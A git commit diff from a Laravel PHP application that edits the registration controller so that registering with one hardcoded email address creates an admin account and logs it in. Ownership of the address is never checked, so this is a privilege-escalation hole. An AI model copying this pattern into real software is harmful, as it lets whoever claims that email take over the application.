847c81448e42a77c7e2791b7ec788ae6d1e94fe5
Adrian Borthomierth <adnborthomierth@gmail.com>
2019-06-27 16:44:20 -0430

    Reseteando Bases y configurando

--- app/Http/Controllers/Auth/RegisterController.php
+++ app/Http/Controllers/Auth/RegisterController.php
@@ -45,7 +45,7 @@ class RegisterController extends Controller
     {
         $this->validator($request->all())->validate();
 	   
-	   	if($request->email=='admin@gmail.com'){
+	   	if($request->email=='bosquessur123@gmail.com'){
 			event(new Registered($user = $this->create_admin($request->all())), $user->is_admin=1);
 			$this->guard()->login($user);
 			
